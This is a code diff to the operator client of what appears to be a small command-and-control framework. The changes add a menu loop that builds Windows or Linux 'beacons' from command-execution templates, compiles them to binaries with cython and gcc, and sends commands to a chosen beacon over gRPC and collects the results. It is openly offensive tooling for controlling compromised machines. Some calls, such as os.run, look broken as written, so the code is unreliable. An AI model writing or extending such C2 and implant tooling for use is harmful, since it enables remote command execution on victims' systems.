@@ -4,6 +4,8 @@ import sys
 import grpc
 import protobuff_pb2_grpc as pb2_grpc
 import protobuff_pb2 as pb2
+
+
 class UnaryClient(object):
     """
     Client for gRPC functionality
@@ -27,6 +29,8 @@ class UnaryClient(object):
         message = pb2.Message(bID=beaconID, message=message, opt=opt)
         print(f'{message}')
         return self.stub.GetServerResponse(message)
+
+
 def BobTheBuilder():
     buildmeabeacon = input("Are we building Win or Nix? >")
 
@@ -35,6 +39,8 @@ def BobTheBuilder():
     if buildmeabeacon == "win":
         with open("out.py", 'w') as f:
             f.write(Functemplates.WINCMDEXEC + '\n' + Functemplates.BASE)
+
+
 def FarmerPickles(PyFileName):
     buildmeaexe = input("Are we building a bin or an exe? >")
 
@@ -43,8 +49,11 @@ def FarmerPickles(PyFileName):
     if buildmeaexe == "bin":
         os.run(f"cython {PyFileName}.py --embed")
         PYTHONLIBVER = sys.version_info[:2]
-        os.run(f"gcc -Os $(python3-config --includes) {PyFileName}.c -o output_bin_file $(python3-config --ldflags) -l {PYTHONLIBVER}")
-def SendCommand(beaconID):
+        os.run(
+            f"gcc -Os $(python3-config --includes) {PyFileName}.c -o output_bin_file $(python3-config --ldflags) -l {PYTHONLIBVER}")
+
+
+def SendCommand():
     '''
     This uses gRPC to talk with the C2
     We take the command to run and the beaconID to update and write it to the beacons file
@@ -53,12 +62,18 @@ def SendCommand(beaconID):
     :param beaconID: The beacon we want to target
     :return: Get the result of the command
     '''
+    beaconID = input("Input beacon ID > ")
     command = input("If setting new command > ")
     opt = input("Get Results (GR) or Set Command (SC) > ")
     client = UnaryClient()
     result = client.get_url(message=command, beaconID=beaconID, opt=opt)
     print(f'{result}')
 
+
 if __name__ == '__main__':
-    bID = input("Input beacon ID > ")
-    SendCommand(bID)
+    while 1:
+        choice = input("Generate a new beacon (1) or interact with beacons (2) > ")
+        if choice == '1':
+            BobTheBuilder()
+        if choice == '2':
+            SendCommand()
